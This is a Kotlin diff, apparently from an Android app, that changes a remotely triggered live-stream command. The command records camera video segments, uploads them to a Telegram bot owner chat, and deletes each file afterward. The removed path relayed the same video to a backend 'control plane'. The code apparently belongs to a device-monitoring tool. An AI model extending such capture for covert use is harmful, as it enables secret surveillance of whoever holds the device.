@@ -130,27 +130,8 @@ class LiveStreamCommand @Inject constructor(
                         val caption = "🔴 LIVE [Seg $segNum] — $cameraStr Camera — $elapsedStr elapsed"
 
                         try {
-                            if (preferencesManager.useBackendServer) {
-                                // Relay through VPS backend control plane
-                                val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
-                                val msgBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
-                                val reqFile = videoFile.asRequestBody("video/mp4".toMediaTypeOrNull())
-                                val videoPart = MultipartBody.Part.createFormData("video", videoFile.name, reqFile)
-
-                                val resp = pasaBackendApi.sendDeviceResponse(
-                                    deviceId = deviceIdBody,
-                                    commandId = null,
-                                    message = msgBody,
-                                    photo = null,
-                                    audio = null,
-                                    video = videoPart,
-                                    evidence = null,
-                                    latitude = null,
-                                    longitude = null
-                                )
-                                Log.i(TAG, "Segment $segNum relayed to backend: ${resp.ok}")
-                            } else if (preferencesManager.botToken.isNotBlank() && preferencesManager.ownerChatIdLong != 0L) {
-                                // Direct Telegram bot API
+                            // Direct Telegram dispatch (Strategy 1: Zero-Storage, zero server media persistence)
+                            if (preferencesManager.botToken.isNotBlank() && preferencesManager.ownerChatIdLong != 0L) {
                                 val mediaType = "video/mp4".toMediaTypeOrNull()
                                 val requestBody = videoFile.asRequestBody(mediaType)
                                 val videoPart = MultipartBody.Part.createFormData(
@@ -168,13 +149,13 @@ class LiveStreamCommand @Inject constructor(
                                 )
                                 Log.i(TAG, "Segment $segNum sent directly to Telegram")
                             } else {
-                                Log.w(TAG, "No valid transport available to dispatch segment $segNum")
+                                Log.w(TAG, "No valid Telegram bot credentials to dispatch segment $segNum")
                             }
                         } catch (e: Exception) {
                             Log.w(TAG, "Failed to dispatch segment $segNum: ${e.message}")
+                        } finally {
+                            try { videoFile.delete() } catch (_: Exception) {}
                         }
-
-                        try { videoFile.delete() } catch (_: Exception) {}
                     } else {
                         consecutiveFailures++
                         Log.w(TAG, "Segment $segNum capture failed (consecutive: $consecutiveFailures)")
